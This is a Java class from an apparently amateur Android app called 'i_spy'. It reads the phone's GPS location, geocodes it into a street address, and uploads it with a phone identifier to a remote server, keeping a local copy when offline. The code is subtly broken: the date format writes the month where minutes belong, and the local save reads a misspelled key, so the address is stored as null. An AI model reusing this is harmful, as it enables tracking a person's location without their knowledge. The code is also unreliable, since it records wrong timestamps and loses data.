package com.um.asn.i_spy;

import android.content.Context;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutionException;

public class PositionGPS {

    public final static String SERVER_DOMAIN = "https://ispy.calyxe.fr/index.php/";
    public Context context;
    public Location location;
    public HashMap<String, String> address;
    public String id_phone;

    public PositionGPS(Context context, String id_phone) {
        this.context = context;
        this.address = new HashMap<String, String>();
        this.id_phone = id_phone;
    }

    public void setLocation() {
        GPSListener gps = new GPSListener(this.context);
        this.location = gps.getLocation();
    }

    public void setAddress() {
        Geocoder geocoder = new Geocoder(this.context, Locale.getDefault());
        try {
            List<Address> addresses = geocoder.getFromLocation(this.location.getLatitude(), this.location.getLongitude(), 1);
            Address obj = addresses.get(0);
            this.address.put("adresse", obj.getAddressLine(0));
            this.address.put("pays", obj.getCountryName());
            this.address.put("code_postal", obj.getPostalCode());
            this.address.put("ville", obj.getLocality());

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void saveLocation(ConnectivityManager cm) {
        setLocation();

        if (this.location != null) {
            System.out.println("Latitude : " + location.getLatitude() + " / Longitude : " + location.getLongitude());
            NetworkInfo networkInfo = cm.getActiveNetworkInfo();
            if (networkInfo != null && networkInfo.isConnected()) {
                insertDist();
            } else {
                insertLocal();
            }
        }
    }

    public void insertDist() {
        setAddress();

        JSONObject jo = new JSONObject();
        try {
            jo.put("latitude", this.location.getLatitude());
            jo.put("longitude", this.location.getLongitude());
            for (Map.Entry<String, String> field : this.address.entrySet()) {
                jo.put(field.getKey(), field.getValue());
            }
            SimpleDateFormat sdf = new SimpleDateFormat("YYYY-MM-dd HH:MM");
            jo.put("date_position", sdf.format(new Date()));
            jo.put("id_telephone", this.id_phone);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        JSONObject result = null;
        try {
            result = new JSONObject((String) new HttpPostTask().execute(new Object[]{SERVER_DOMAIN + "position_gps/", jo.toString()}).get());

            if (!(boolean) result.get("success")) {
                insertLocal();
                return;
            }
            System.out.println("Position saved dist");

        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (ExecutionException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public void insertLocal() {
        BDOpenHelper myBD = new BDOpenHelper(this.context, BDOpenHelper.POSITION_GPS_COLUMN_ID, null, 1);
        SimpleDateFormat sdf = new SimpleDateFormat("YYYY-MM-dd HH:MM");
        myBD.insertPosition(
                location.getLatitude(),
                location.getLongitude(),
                address.get("pays"),
                address.get("ville"),
                address.get("addresse"),
                address.get("code_postal"),
                sdf.format(new Date())
        );
        System.out.println("Position saved local (" + myBD.getAllPositions().size() + ")");
    }

}